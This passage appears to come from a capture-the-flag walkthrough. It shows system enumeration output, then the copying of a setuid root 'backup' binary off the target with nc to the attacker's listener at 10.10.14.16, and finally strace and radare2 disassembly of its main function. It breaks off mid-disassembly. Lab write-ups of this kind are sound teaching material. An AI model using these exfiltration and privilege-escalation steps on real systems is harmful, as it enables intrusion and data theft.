-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 568 Jul 27  2017 /etc/mongod.conf
-rw-r--r-- 1 root root 144 Aug 29  2017 /etc/kernel-img.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 7788 Aug 29  2017 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf


[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Aug  1  2017 .
drwxr-xr-x 15 root root 4096 Sep  3  2017 ..


### SCAN COMPLETE ####################################
tom-4.3$
```

###### Binary Exploitation

```sh
tom-4.3$ file /usr/local/bin/backup
/usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
tom-4.3$
tom-4.3$ ls -l /usr/local/bin/backup
-rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
tom-4.3$
tom-4.3$ /usr/local/bin/backup
tom-4.3$
```

```sh
root@kali:~/node# nc -nlvp 8082 > backup
listening on [any] 8082 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.58] 46186
root@kali:~/node#
```

```sh
tom-4.3$ nc 10.10.14.16 8082 < /usr/local/bin/backup
```

```sh
tom-4.3$ md5sum /usr/local/bin/backup
f2cd106436c96a80133fcddd06206042  /usr/local/bin/backup
tom-4.3$
```

```sh
root@kali:~/node# file backup
backup: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
root@kali:~/node#
root@kali:~/node# md5sum backup
f2cd106436c96a80133fcddd06206042  backup
root@kali:~/node#
```

```sh
root@kali:~/node# chmod +x backup
```

```sh
root@kali:~/node# strace ./backup
execve("./backup", ["./backup"], 0x7fffcb6866a0 /* 21 vars */) = 0
strace: [ Process PID=7978 runs in 32 bit mode. ]
brk(NULL)                               = 0x8d99000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fa3000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=146378, ...}) = 0
mmap2(NULL, 146378, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7f7f000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\220\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1926828, ...}) = 0
mmap2(NULL, 1935900, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7da6000
mprotect(0xf7f78000, 4096, PROT_NONE)   = 0
mmap2(0xf7f79000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d2000) = 0xf7f79000
mmap2(0xf7f7c000, 10780, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7f7c000
close(3)                                = 0
set_thread_area({entry_number=-1, base_addr=0xf7fa40c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
mprotect(0xf7f79000, 8192, PROT_READ)   = 0
mprotect(0x804b000, 4096, PROT_READ)    = 0
mprotect(0xf7fd0000, 4096, PROT_READ)   = 0
munmap(0xf7f7f000, 146378)              = 0
geteuid32()                             = 0
setuid32(0)                             = 0
exit_group(1)                           = ?
+++ exited with 1 +++
root@kali:~/node#
```

```sh
root@kali:~/node# r2 ./backup
[0x08048780]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x08048780]> afl
0x080485a8    3 35           sym._init
0x080485e0    1 6            sym.imp.strstr
0x080485f0    1 6            sym.imp.strcmp
0x08048600    1 6            sym.imp.printf
0x08048610    1 6            sym.imp.strcspn
0x08048620    1 6            sym.imp.fgets
0x08048630    1 6            sym.imp.fclose
0x08048640    1 6            sym.imp.time
0x08048650    1 6            sym.imp.geteuid
0x08048660    1 6            sym.imp.strcat
0x08048670    1 6            sym.imp.strcpy
0x08048680    1 6            sym.imp.getpid
0x08048690    1 6            sym.imp.puts
0x080486a0    1 6            sym.imp.system
0x080486b0    1 6            sym.imp.clock
0x080486c0    1 6            sym.imp.exit
0x080486d0    1 6            sym.imp.srand
0x080486e0    1 6            sym.imp.strchr
0x080486f0    1 6            sym.imp.__libc_start_main
0x08048700    1 6            sym.imp.fopen
0x08048710    1 6            sym.imp.strncpy
0x08048720    1 6            sym.imp.rand
0x08048730    1 6            sym.imp.access
0x08048740    1 6            sym.imp.setuid
0x08048750    1 6            sym.imp.sprintf
0x08048760    1 6            sym.imp.remove
0x08048770    1 6            sub.__gmon_start_770
0x08048780    1 33           entry0
0x080487b0    1 4            sym.__x86.get_pc_thunk.bx
0x080487c0    4 43           sym.deregister_tm_clones
0x080487f0    4 53           sym.register_tm_clones
0x08048830    3 30           sym.__do_global_dtors_aux
0x08048850    4 43   -> 40   entry1.init
0x0804887b    1 197          sym.mix
0x08048940    1 63           sym.displayWarning
0x0804897f    1 63           sym.displaySuccess
0x080489be    1 63           sym.displayTarget
0x080489fd   50 2237         sym.main
0x080492c0    4 93           sym.__libc_csu_init
0x08049320    1 2            sym.__libc_csu_fini
0x08049324    1 20           sym._fini
[0x08048780]> s sym.main
[0x080489fd]> pdf
Do you want to print 683 lines? (y/N)
            ;-- main:
/ (fcn) sym.main 2237
|   sym.main ();
|           ; var int local_10b1h @ ebp-0x10b1
|           ; var int local_ad5h @ ebp-0xad5
|           ; var int local_6edh @ ebp-0x6ed
|           ; var int local_4f9h @ ebp-0x4f9
|           ; var int local_111h @ ebp-0x111
|           ; var int local_adh @ ebp-0xad
|           ; var int local_abh @ ebp-0xab
|           ; var int local_aah @ ebp-0xaa
|           ; var int local_a8h @ ebp-0xa8
|           ; var int local_a4h @ ebp-0xa4
|           ; var int local_a2h @ ebp-0xa2
|           ; var int local_a1h @ ebp-0xa1
|           ; var int local_9fh @ ebp-0x9f
|           ; var int local_9eh @ ebp-0x9e
|           ; var int local_9ch @ ebp-0x9c
|           ; var int local_98h @ ebp-0x98
|           ; var int local_96h @ ebp-0x96
|           ; var int local_92h @ ebp-0x92
|           ; var int local_90h @ ebp-0x90
|           ; var int local_2ch @ ebp-0x2c
|           ; var int local_28h @ ebp-0x28
|           ; var int local_24h @ ebp-0x24
|           ; var int local_20h @ ebp-0x20
|           ; var int local_1ch @ ebp-0x1c
|           ; var int local_10h @ ebp-0x10
|           ; var int local_4h @ esp+0x4
|           ; DATA XREF from 0x08048797 (entry0)
|           0x080489fd      8d4c2404       lea ecx, dword [local_4h]   ; 4
|           0x08048a01      83e4f0         and esp, 0xfffffff0
|           0x08048a04      ff71fc         push dword [ecx - 4]
|           0x08048a07      55             push ebp
|           0x08048a08      89e5           mov ebp, esp
|           0x08048a0a      57             push edi
|           0x08048a0b      56             push esi
|           0x08048a0c      53             push ebx
|           0x08048a0d      51             push ecx
|           0x08048a0e      81eca8100000   sub esp, 0x10a8
|           0x08048a14      89cb           mov ebx, ecx
|           0x08048a16      e835fcffff     call sym.imp.geteuid        ; uid_t geteuid(void)
|           0x08048a1b      83ec0c         sub esp, 0xc
|           0x08048a1e      50             push eax
|           0x08048a1f      e81cfdffff     call sym.imp.setuid
|           0x08048a24      83c410         add esp, 0x10
|           0x08048a27      c745e4000000.  mov dword [local_1ch], 0
|           0x08048a2e      c745e0000000.  mov dword [local_20h], 0
|           0x08048a35      833b03         cmp dword [ebx], 3          ; [0x3:4]=-1 ; 3
|       ,=< 0x08048a38      7f0a           jg 0x8048a44
|       |   0x08048a3a      83ec0c         sub esp, 0xc
|       |   0x08048a3d      6a01           push 1                      ; 1
|       |   0x08048a3f      e87cfcffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08048a38 (sym.main)
|       `-> 0x08048a44      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x08048a47      83c004         add eax, 4
|           0x08048a4a      8b00           mov eax, dword [eax]
|           0x08048a4c      83ec08         sub esp, 8
|           0x08048a4f      688c930408     push 0x804938c              ; "-q"
|           0x08048a54      50             push eax
|           0x08048a55      e896fbffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
|           0x08048a5a      83c410         add esp, 0x10
|           0x08048a5d      85c0           test eax, eax
|       ,=< 0x08048a5f      0f84c7010000   je 0x8048c2c
|       |   0x08048a65      c745e0010000.  mov dword [local_20h], 1
|       |   0x08048a6c      83ec0c         sub esp, 0xc
|       |   0x08048a6f      6890930408     push str.                   ; 0x8049390 ; "\n\n\n             ____________________________________________________"
|       |   0x08048a74      e817fcffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048a79      83c410         add esp, 0x10
|       |   0x08048a7c      83ec0c         sub esp, 0xc
|       |   0x08048a7f      68d8930408     push str.                   ; 0x80493d8 ; "            /                                                    \\"
|       |   0x08048a84      e807fcffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048a89      83c410         add esp, 0x10
|       |   0x08048a8c      83ec0c         sub esp, 0xc
|       |   0x08048a8f      681c940408     push str.                   ; 0x804941c ; "           |    _____________________________________________     |"
|       |   0x08048a94      e8f7fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048a99      83c410         add esp, 0x10
|       |   0x08048a9c      83ec0c         sub esp, 0xc
|       |   0x08048a9f      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048aa4      e8e7fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048aa9      83c410         add esp, 0x10
|       |   0x08048aac      83ec0c         sub esp, 0xc
|       |   0x08048aaf      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048ab4      e8d7fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048ab9      83c410         add esp, 0x10
|       |   0x08048abc      83ec0c         sub esp, 0xc
|       |   0x08048abf      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048ac4      e8c7fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048ac9      83c410         add esp, 0x10
|       |   0x08048acc      83ec0c         sub esp, 0xc
|       |   0x08048acf      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048ad4      e8b7fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048ad9      83c410         add esp, 0x10
|       |   0x08048adc      83ec0c         sub esp, 0xc
|       |   0x08048adf      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048ae4      e8a7fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048ae9      83c410         add esp, 0x10
|       |   0x08048aec      83ec0c         sub esp, 0xc
|       |   0x08048aef      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048af4      e897fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048af9      83c410         add esp, 0x10
|       |   0x08048afc      83ec0c         sub esp, 0xc
|       |   0x08048aff      68a4940408     push str.Secure_Backup_v1.0 ; 0x80494a4 ; "           |   |             Secure Backup v1.0              |    |"
|       |   0x08048b04      e887fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048b09      83c410         add esp, 0x10
|       |   0x08048b0c      83ec0c         sub esp, 0xc
|       |   0x08048b0f      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048b14      e877fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048b19      83c410         add esp, 0x10
|       |   0x08048b1c      83ec0c         sub esp, 0xc
|       |   0x08048b1f      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048b24      e867fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048b29      83c410         add esp, 0x10
|       |   0x08048b2c      83ec0c         sub esp, 0xc
|       |   0x08048b2f      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048b34      e857fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048b39      83c410         add esp, 0x10
|       |   0x08048b3c      83ec0c         sub esp, 0xc
|       |   0x08048b3f      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048b44      e847fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048b49      83c410         add esp, 0x10
|       |   0x08048b4c      83ec0c         sub esp, 0xc
|       |   0x08048b4f      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048b54      e837fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048b59      83c410         add esp, 0x10
|       |   0x08048b5c      83ec0c         sub esp, 0xc
|       |   0x08048b5f      6860940408     push str.                   ; 0x8049460 ; "           |   |                                             |    |"
|       |   0x08048b64      e827fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048b69      83c410         add esp, 0x10
|       |   0x08048b6c      83ec0c         sub esp, 0xc
|       |   0x08048b6f      68e8940408     push str.                   ; 0x80494e8 ; "           |   |_____________________________________________|    |"
|       |   0x08048b74      e817fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048b79      83c410         add esp, 0x10
|       |   0x08048b7c      83ec0c         sub esp, 0xc
|       |   0x08048b7f      682c950408     push str.                   ; 0x804952c ; "           |                                                      |"
|       |   0x08048b84      e807fbffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048b89      83c410         add esp, 0x10
|       |   0x08048b8c      83ec0c         sub esp, 0xc
|       |   0x08048b8f      6870950408     push str.                   ; 0x8049570 ; "            \\_____________________________________________________/"
|       |   0x08048b94      e8f7faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048b99      83c410         add esp, 0x10
|       |   0x08048b9c      83ec0c         sub esp, 0xc
|       |   0x08048b9f      68b4950408     push str.                   ; 0x80495b4 ; "                   \\_______________________________________/"
|       |   0x08048ba4      e8e7faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048ba9      83c410         add esp, 0x10
|       |   0x08048bac      83ec0c         sub esp, 0xc
|       |   0x08048baf      68f4950408     push str.                   ; 0x80495f4 ; "                _______________________________________________"
|       |   0x08048bb4      e8d7faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048bb9      83c410         add esp, 0x10
|       |   0x08048bbc      83ec0c         sub esp, 0xc
|       |   0x08048bbf      6834960408     push str.._._._._._._._._._._._._._._._._._._. ; 0x8049634 ; "             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_"
|       |   0x08048bc4      e8c7faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048bc9      83c410         add esp, 0x10
|       |   0x08048bcc      83ec0c         sub esp, 0xc
|       |   0x08048bcf      6878960408     push str.._._._.___._._._._._._._._._._._._._._._._.__.__._._. ; 0x8049678 ; "          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_"
|       |   0x08048bd4      e8b7faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048bd9      83c410         add esp, 0x10
|       |   0x08048bdc      83ec0c         sub esp, 0xc
|       |   0x08048bdf      68c0960408     push str.._._._._.___._._._._._._._._._._._._._._._._._____._._._._. ; 0x80496c0 ; "       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_"
|       |   0x08048be4      e8a7faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048be9      83c410         add esp, 0x10
|       |   0x08048bec      83ec0c         sub esp, 0xc
|       |   0x08048bef      680c970408     push str.._._._._._._____._._._._._._._._._._._._._._._._._____._._._._._. ; 0x804970c ; "    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_"
|       |   0x08048bf4      e897faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048bf9      83c410         add esp, 0x10
|       |   0x08048bfc      83ec0c         sub esp, 0xc
|       |   0x08048bff      6858970408     push str.._._._._._._.___._._._____________________________._._.___._.___._._._. ; 0x8049758 ; " _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_"
|       |   0x08048c04      e887faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048c09      83c410         add esp, 0x10
|       |   0x08048c0c      83ec0c         sub esp, 0xc
|       |   0x08048c0f      68a8970408     push str.:_____________________________________________________________________________: ; 0x80497a8 ; ":-----------------------------------------------------------------------------:"
|       |   0x08048c14      e877faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048c19      83c410         add esp, 0x10
|       |   0x08048c1c      83ec0c         sub esp, 0xc
|       |   0x08048c1f      68f8970408     push str.._._________________________________________________________________._. ; 0x80497f8 ; "`---._.-----------------------------------------------------------------._.---'\n\n"
|       |   0x08048c24      e867faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x08048c29      83c410         add esp, 0x10
|       |   ; JMP XREF from 0x08048a5f (sym.main)
|       `-> 0x08048c2c      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x08048c2f      83c008         add eax, 8
|           0x08048c32      8b00           mov eax, dword [eax]
|           0x08048c34      83ec04         sub esp, 4
|           0x08048c37      6a64           push 0x64                   ; 'd' ; 100
|           0x08048c39      50             push eax
|           0x08048c3a      8d8570ffffff   lea eax, dword [local_90h]
|           0x08048c40      50             push eax
|           0x08048c41      e8cafaffff     call sym.imp.strncpy        ; char *strncpy(char *dest, const char *src, size_t  n)
|           0x08048c46      83c410         add esp, 0x10
|           0x08048c49      66c7856effff.  mov word [local_92h], 0x2f  ; '/' ; 47
|           0x08048c52      66c78553ffff.  mov word [local_adh], 0x652f
|           0x08048c5b      c68555ffffff.  mov byte [local_abh], 0
|           0x08048c62      66c78556ffff.  mov word [local_aah], 0x6374
|           0x08048c6b      c68558ffffff.  mov byte [local_a8h], 0
|           0x08048c72      83ec08         sub esp, 8
|           0x08048c75      8d856effffff   lea eax, dword [local_92h]
|           0x08048c7b      50             push eax
|           0x08048c7c      8d8553ffffff   lea eax, dword [local_adh]
|           0x08048c82      83c006         add eax, 6
|           0x08048c85      50             push eax
|           0x08048c86      e8e5f9ffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
|           0x08048c8b      83c410         add esp, 0x10
|           0x08048c8e      8d8553ffffff   lea eax, dword [local_adh]
|           0x08048c94      83c006         add eax, 6
|           0x08048c97      b9ffffffff     mov ecx, 0xffffffff         ; -1
|           0x08048c9c      89c2           mov edx, eax
|           0x08048c9e      b800000000     mov eax, 0
|           0x08048ca3      89d7           mov edi, edx
|           0x08048ca5      f2ae           repne scasb al, byte es:[edi]
|           0x08048ca7      89c8           mov eax, ecx
|           0x08048ca9      f7d0           not eax
|           0x08048cab      8d50ff         lea edx, dword [eax - 1]
|           0x08048cae      8d8553ffffff   lea eax, dword [local_adh]
|           0x08048cb4      83c006         add eax, 6
|           0x08048cb7      01d0           add eax, edx
|           0x08048cb9      66c7006d00     mov word [eax], 0x6d        ; 'm' ; [0x6d:2]=0xffff ; 109
|           0x08048cbe      66c7855cffff.  mov word [local_a4h], 0x7079
|           0x08048cc7      c6855effffff.  mov byte [local_a2h], 0
|           0x08048cce      66c7855fffff.  mov word [local_a1h], 0x616c
|           0x08048cd7      c68561ffffff.  mov byte [local_9fh], 0
|           0x08048cde      66c78562ffff.  mov word [local_9eh], 0x6563
|           0x08048ce7      c68564ffffff.  mov byte [local_9ch], 0
|           0x08048cee      83ec08         sub esp, 8
|           0x08048cf1      8d856effffff   lea eax, dword [local_92h]
|           0x08048cf7      50             push eax
|           0x08048cf8      8d8553ffffff   lea eax, dword [local_adh]
|           0x08048cfe      83c012         add eax, 0x12
|           0x08048d01      50             push eax
|           0x08048d02      e869f9ffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
|           0x08048d07      83c410         add esp, 0x10
|           0x08048d0a      8d8553ffffff   lea eax, dword [local_adh]
|           0x08048d10      83c012         add eax, 0x12
|           0x08048d13      b9ffffffff     mov ecx, 0xffffffff         ; -1
|           0x08048d18      89c2           mov edx, eax
|           0x08048d1a      b800000000     mov eax, 0
|           0x08048d1f      89d7           mov edi, edx
|           0x08048d21      f2ae           repne scasb al, byte es:[edi]
|           0x08048d23      89c8           mov eax, ecx
|           0x08048d25      f7d0           not eax
|           0x08048d27      8d50ff         lea edx, dword [eax - 1]
|           0x08048d2a      8d8553ffffff   lea eax, dword [local_adh]
|           0x08048d30      83c012         add eax, 0x12
|           0x08048d33      01d0           add eax, edx
|           0x08048d35      66c7006b00     mov word [eax], 0x6b        ; 'k' ; [0x6b:2]=0xffff ; 107
|           0x08048d3a      66c78568ffff.  mov word [local_98h], 0x7965
|           0x08048d43      c6856affffff.  mov byte [local_96h], 0
|           0x08048d4a      8d8553ffffff   lea eax, dword [local_adh]
|           0x08048d50      83c018         add eax, 0x18
|           0x08048d53      66c7007300     mov word [eax], 0x73        ; 's' ; [0x73:2]=0xffff ; 115
|           0x08048d58      83ec08         sub esp, 8
|           0x08048d5b      8d8553ffffff   lea eax, dword [local_adh]
|           0x08048d61      50             push eax
|           0x08048d62      8d85effeffff   lea eax, dword [local_111h]
|           0x08048d68      50             push eax
|           0x08048d69      e802f9ffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
|           0x08048d6e      83c410         add esp, 0x10
|           0x08048d71      c745dc010000.  mov dword [local_24h], 1
|       ,=< 0x08048d78      eb28           jmp 0x8048da2
|       |   ; JMP XREF from 0x08048da6 (sym.main)
|      .--> 0x08048d7a      8d8d53ffffff   lea ecx, dword [local_adh]
|      :|   0x08048d80      8b55dc         mov edx, dword [local_24h]
|      :|   0x08048d83      89d0           mov eax, edx
|      :|   0x08048d85      01c0           add eax, eax
|      :|   0x08048d87      01d0           add eax, edx
|      :|   0x08048d89      01c8           add eax, ecx
|      :|   0x08048d8b      83ec08         sub esp, 8
|      :|   0x08048d8e      50             push eax
|      :|   0x08048d8f      8d85effeffff   lea eax, dword [local_111h]
|      :|   0x08048d95      50             push eax
|      :|   0x08048d96      e8c5f8ffff     call sym.imp.strcat         ; char*strcat(char *s1, const char *s2)
|      :|   0x08048d9b      83c410         add esp, 0x10
|      :|   0x08048d9e      8345dc01       add dword [local_24h], 1
|      :|   ; JMP XREF from 0x08048d78 (sym.main)
|      :`-> 0x08048da2      837ddc08       cmp dword [local_24h], 8    ; [0x8:4]=-1 ; 8
|      `==< 0x08048da6      7ed2           jle 0x8048d7a
|           0x08048da8      83ec08         sub esp, 8
|           0x08048dab      684a980408     push 0x804984a
|           0x08048db0      8d85effeffff   lea eax, dword [local_111h]
|           0x08048db6      50             push eax
|           0x08048db7      e844f9ffff     call sym.imp.fopen          ; file*fopen(const char *filename,
|           0x08048dbc      83c410         add esp, 0x10
|           0x08048dbf      8945d8         mov dword [local_28h], eax
|           0x08048dc2      837dd800       cmp dword [local_28h], 0
|       ,=< 0x08048dc6      7579           jne 0x8048e41
|       |   0x08048dc8      837de001       cmp dword [local_20h], 1    ; [0x1:4]=-1 ; 1
|      ,==< 0x08048dcc      7510           jne 0x8048dde
|      ||   0x08048dce      83ec0c         sub esp, 0xc
|      ||   0x08048dd1      684c980408     push str.Could_not_open_file ; 0x804984c ; "Could not open file\n\n"
|      ||   0x08048dd6      e865fbffff     call sym.displayWarning
|      ||   0x08048ddb      83c410         add esp, 0x10
|      ||   ; JMP XREF from 0x08048dcc (sym.main)
|      `--> 0x08048dde      83ec0c         sub esp, 0xc
|       |   0x08048de1      6a01           push 1                      ; 1
|       |   0x08048de3      e8d8f8ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08048e5d (sym.main)
|      .--> 0x08048de8      83ec08         sub esp, 8
|      :|   0x08048deb      6862980408     push 0x8049862
|      :|   0x08048df0      8d8507fbffff   lea eax, dword [local_4f9h]
|      :|   0x08048df6      50             push eax
|      :|   0x08048df7      e814f8ffff     call sym.imp.strcspn        ; size_t strcspn(const char *s1, const char *s2)
|      :|   0x08048dfc      83c410         add esp, 0x10
|      :|   0x08048dff      c6840507fbff.  mov byte [ebp + eax - 0x4f9], 0
|      :|   0x08048e07      83ec08         sub esp, 8
|      :|   0x08048e0a      8d8507fbffff   lea eax, dword [local_4f9h]
|      :|   0x08048e10      50             push eax
|      :|   0x08048e11      8d8570ffffff   lea eax, dword [local_90h]
|      :|   0x08048e17      50             push eax
|      :|   0x08048e18      e8d3f7ffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
|      :|   0x08048e1d      83c410         add esp, 0x10
|      :|   0x08048e20      85c0           test eax, eax
|     ,===< 0x08048e22      751d           jne 0x8048e41
|     |:|   0x08048e24      c745e4010000.  mov dword [local_1ch], 1
|     |:|   0x08048e2b      837de001       cmp dword [local_20h], 1    ; [0x1:4]=-1 ; 1
|    ,====< 0x08048e2f      7510           jne 0x8048e41
|    ||:|   0x08048e31      83ec0c         sub esp, 0xc
|    ||:|   0x08048e34      6864980408     push str.Validated_access_token ; 0x8049864 ; "Validated access token"
|    ||:|   0x08048e39      e841fbffff     call sym.displaySuccess
|    ||:|   0x08048e3e      83c410         add esp, 0x10
|    ||:|   ; JMP XREF from 0x08048dc6 (sym.main)
|    ||:|   ; JMP XREF from 0x08048e22 (sym.main)
|    ||:|   ; JMP XREF from 0x08048e2f (sym.main)
|    ``-`-> 0x08048e41      83ec04         sub esp, 4
|      :    0x08048e44      ff75d8         push dword [local_28h]
|      :    0x08048e47      68e8030000     push 0x3e8                  ; 1000
|      :    0x08048e4c      8d8507fbffff   lea eax, dword [local_4f9h]
|      :    0x08048e52      50             push eax
|      :    0x08048e53      e8c8f7ffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|      :    0x08048e58      83c410         add esp, 0x10
|      :    0x08048e5b      85c0           test eax, eax
|      `==< 0x08048e5d      7589           jne 0x8048de8
|           0x08048e5f      837de401       cmp dword [local_1ch], 1    ; [0x1:4]=-1 ; 1
|       ,=< 0x08048e63      7420           je 0x8048e85
|       |   0x08048e65      837de001       cmp dword [local_20h], 1    ; [0x1:4]=-1 ; 1
|      ,==< 0x08048e69      7510           jne 0x8048e7b
|      ||   0x08048e6b      83ec0c         sub esp, 0xc
|      ||   0x08048e6e      687c980408     push str.Ah_ah_ah__You_didn_t_say_the_magic_word ; 0x804987c ; "Ah-ah-ah! You didn't say the magic word!\n\n"
|      ||   0x08048e73      e8c8faffff     call sym.displayWarning
|      ||   0x08048e78      83c410         add esp, 0x10
|      ||   ; JMP XREF from 0x08048e69 (sym.main)
|      `--> 0x08048e7b      83ec0c         sub esp, 0xc
|       |   0x08048e7e      6a01           push 1                      ; 1
|       |   0x08048e80      e83bf8ffff     call sym.imp.exit           ; void exit(int status)
|       |   ; JMP XREF from 0x08048e63 (sym.main)
|       `-> 0x08048e85      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=-1 ; 4
|           0x08048e88      83c00c         add eax, 0xc
|           0x08048e8b      8b00           mov eax, dword [eax]
|           0x08048e8d      83ec08         sub esp, 8
|           0x08048e90      68a7980408     push 0x80498a7
|           0x08048e95      50             push eax
|           0x08048e96      e845f7ffff     call sym.imp.strstr         ; char*strstr(char *s1, const char *s2)
|           0x08048e9b      83c410         add esp, 0x10
|           0x08048e9e      85c0           test eax, eax
|       ,=< 0x08048ea0      742a           je 0x8048ecc
|       |   0x08048ea2      83ec0c         sub esp, 0xc
|       |   0x08048ea5      68ac980408     push str.Finished__Encoded_backup_is_below: ; 0x80498ac ; "Finished! Encoded backup is below:\n"
|       |   0x08048eaa      e8d0faffff     call sym.displaySuccess
|       |   0x08048eaf      83c410         add esp, 0x10
|       |   0x08048eb2      83ec0c         sub esp, 0xc
